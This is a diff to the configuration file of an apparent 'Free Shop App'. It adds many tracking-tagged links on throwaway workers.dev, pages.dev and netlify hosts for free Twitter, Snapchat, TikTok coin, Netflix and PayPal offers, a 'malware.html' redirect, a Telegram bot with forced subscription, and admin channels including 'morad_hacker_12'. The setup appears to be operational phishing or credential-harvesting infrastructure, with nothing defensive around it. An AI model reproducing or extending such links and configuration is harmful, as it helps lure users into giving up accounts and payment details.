@@ -1,5 +1,5 @@
 # Free Shop App Configuration
-# Last update: 2025-01-15
+# Last update: 2025-03-27
 
 [VERSION]
 version=1.0.0
@@ -17,16 +17,26 @@ tiktok=https://fro.roks.workers.dev/tik?id=8108497004
 facebook=https://pol1.roks.workers.dev/face?id=8108497004
 youtube=https://green-pond.roks.workers.dev/yot?id=8108497004
 facebook_likes=https://patient-mode-af05.roks.workers.dev/mans?id=8108497004
+twitter=https://twitter.jrah3594.workers.dev/twitter?id=8108497004
+snapchat=https://snapchat.jrah3594.workers.dev/Snapchat?id=8108497004
+tiktok_coins=https://tiktok.jrah3594.workers.dev/tiktok?id=8108497004
+netflix=https://red-queen-4418.jrah3594.workers.dev/netflix?id=8108497004
+kawai=https://aged-boat-605a.jrah3594.workers.dev/cori?id=8108497004
+warning=https://softtqqa.netlify.app/malware.html?chatId=6808883615&originalLink=https%3A%2F%2Froxip.pages.dev
+paypal=https://hakr9.pages.dev/?id=8108497004
+
+[BOT]
+bot_url=https://t.me/Tdwq_bot?start=8108497004
+force_subscribe=true
 
 [ADMIN]
 admin_channel=https://t.me/etsmrobyo2008moraud
+admin_channel2=https://t.me/morad_hacker_12
 love_channel=https://t.me/V7low
-second_channel=https://t.me/morad_hacker_12
 tiktok_account=https://www.tiktok.com/@etsmrobyo.2008?_r=1&_t=ZS-94xQyDPgUnU
 
 [SUPPORT]
 support_url=https://t.me/etsmrobyo2008moraud
-channel_url=https://t.me/etsmrobyo2008moraud
 
 [SETTINGS]
 loading_time=2
